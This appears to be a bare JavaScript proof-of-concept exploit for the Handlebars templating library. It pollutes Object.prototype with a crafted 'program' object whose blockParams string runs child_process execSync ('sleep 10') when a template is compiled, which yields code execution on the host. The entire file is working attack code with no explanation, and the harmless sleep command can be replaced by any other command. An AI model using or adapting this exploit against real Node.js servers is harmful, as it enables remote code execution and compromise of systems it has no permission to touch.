const hbs = require('handlebars');

Object.prototype.type="constructor",
Object.prototype.program={
    "opcodes": [],
    "children":[],
    "blockParams": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
}

// Register the 'emptyComment' partial
hbs.registerPartial('emptyComment', '');

const source = `foo{{> emptyComment}}`
const template =  hbs.compile(source);
template({msg:"World!"})

